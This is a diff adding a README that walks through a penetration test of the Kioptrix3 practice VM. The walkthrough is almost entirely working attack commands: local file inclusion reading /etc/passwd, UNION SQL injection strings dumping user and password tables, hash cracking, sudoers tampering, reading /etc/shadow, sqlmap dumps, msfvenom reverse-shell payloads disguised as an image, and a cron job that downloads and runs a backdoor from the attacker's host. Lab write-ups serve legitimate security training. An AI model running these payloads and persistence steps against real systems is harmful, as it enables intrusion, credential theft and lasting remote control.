@@ -1,0 +1,207 @@
+Kioptrix3 Walkthrough and Exploitation Guide
+
+This README documents a penetration testing walkthrough on the Kioptrix3 vulnerable VM, demonstrating network scanning, enumeration, SQL injection, password cracking, privilege escalation, and reverse shell payloads.
+Network Scanning and Host Discovery
+
+First, discover live hosts on the local network:
+
+bash
+
+nmap 192.168.0.0/24 -n -sn
+
+    Note: -sn is the correct flag for ping scan (no port scan). The -sP flag is deprecated.
+
+Add the target IP and hostname to /etc/hosts for easier reference:
+
+bash
+
+echo "192.168.0.10 kioptrix3.com" | sudo tee -a /etc/hosts
+cat /etc/hosts
+
+Port Scanning and Service Enumeration
+
+Scan all TCP and UDP ports on the target:
+
+bash
+
+# TCP scan
+nmap -p 1-65535 -T4 -A -v kioptrix3.com
+
+# UDP scan
+nmap -sU -p 1-65535 -T4 -v kioptrix3.com
+
+Alternatively, using us (assuming it's a custom or alias command) for TCP and UDP scans:
+
+bash
+
+us -H -msf -Iv kioptrix3.com -p 1-65535 && us -H -mU -Iv kioptrix3.com -p 1-65535
+
+Web Application Enumeration
+
+Open the target website in Firefox:
+
+bash
+
+firefox kioptrix3.com
+
+Test for Local File Inclusion (LFI):
+
+http://kioptrix3.com/index.php?system=../../../../../etc/passwd
+
+Explore the gallery source code:
+
+http://kioptrix3.com/gallery/gadmin/
+
+Searching Exploits
+
+Navigate to exploit database directory and search for relevant exploits:
+
+bash
+
+cd /pentest/exploits/exploitdb
+grep -i gallarific files.csv
+cat platforms/php/webapps/15891.txt
+
+SQL Injection Testing
+
+Test SQL injection on the gallery page:
+
+bash
+
+firefox "http://kioptrix3.com/gallery/gallery.php?id=null and 1=2 union select 1,2,3,4,5,6"
+firefox "http://kioptrix3.com/gallery/gallery.php?id=null and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4,5,6"
+firefox "http://kioptrix3.com/gallery/gallery.php?id=null and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='dev_accounts'),4,5,6"
+firefox "http://kioptrix3.com/gallery/gallery.php?id=null and 1=2 union select 1,2,(select group_concat(id, 0x3A, username, 0x3A, password) from dev_accounts),4,5,6"
+
+Password Cracking
+
+Save hashes to a file and crack with John the Ripper:
+
+bash
+
+echo -e "0d3eccfb887aabd50f243b3f155c0f85\n5badcaf789d3d1d09794d8f021f40f0e" > /tmp/hashes
+cd /pentest/passwords/john
+./john /tmp/hashes --format=raw-md5
+
+SSH Access and Privilege Escalation
+
+Login via SSH:
+
+bash
+
+ssh loneferret@kioptrix3.com
+# Password: starwars
+
+Check user info and files:
+
+bash
+
+id
+pwd
+ls -lA
+cat CompanyPolicy.README
+
+Check sudoers file permissions and content:
+
+bash
+
+ls -lh /etc/sudoers
+cat /etc/sudoers
+
+Edit sudoers to allow full sudo for loneferret (using ht editor):
+
+bash
+
+sudo ht
+# Edit loneferret line to: loneferret ALL=(ALL) ALL
+# Save and exit
+
+Gain root shell:
+
+bash
+
+sudo su
+id && ifconfig && uname -a && cat /etc/shadow && ls -lAh ~/
+
+Further Web Exploitation and SQLMap Usage
+
+More SQL injection on gallarific_users table:
+
+bash
+
+firefox "http://kioptrix3.com/gallery/gallery.php?id=null and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='gallarific_users'),4,5,6"
+firefox "http://kioptrix3.com/gallery/gallery.php?id=null and 1=2 union select 1,2,(select group_concat(userid, 0x3A, username, 0x3A, password, 0x3A, usertype) from gallarific_users),4,5,6"
+
+Use SQLMap for automated SQL injection:
+
+bash
+
+cd /pentest/database/sqlmap
+./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1" -f -b --current-user --is-dba --dbs
+./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1" --columns
+./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1" --users --passwords
+./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1" --file-read="/etc/passwd"
+./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dump
+
+Uploading a Web Shell and Getting a Reverse Shell
+
+Generate a PHP Meterpreter payload disguised as an image:
+
+bash
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.192 LPORT=443 -f raw > /tmp/evil.jpg
+
+Start Metasploit handler:
+
+bash
+
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 192.168.0.192; set LPORT 443; run"
+
+Upload the payload via the gallery admin interface:
+
+http://kioptrix3.com/gallery/gadmin
+
+Access the uploaded shell:
+
+http://kioptrix3.com/index.php?system=../../../../../home/www/kioptrix3.com/gallery/photos/evil.jpg.html
+
+Post-Exploitation
+
+Spawn a proper TTY shell:
+
+bash
+
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
+python /tmp/shell.py
+
+Switch user and escalate privileges:
+
+bash
+
+su loneferret
+sudo su
+cd ~
+cat Congrats.txt
+
+Persistence via Cron Job
+
+Add a cron job to download and execute a backdoor:
+
+bash
+
+echo '* * * * * root cd /tmp; wget http://192.168.0.192/back.door -O back.door && chmod +x back.door && ./back.door; rm /etc/cron.d/exploit' | sudo tee /etc/cron.d/exploit
+
+Generate a Linux reverse shell payload:
+
+bash
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.192 LPORT=443 -f elf > /var/www/back.door
+file /var/www/back.door
+
+Start Apache and handler:
+
+bash
+
+sudo /etc/init.d/apache2 start
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST 192.168.0.192; set LPORT 443; run"
+
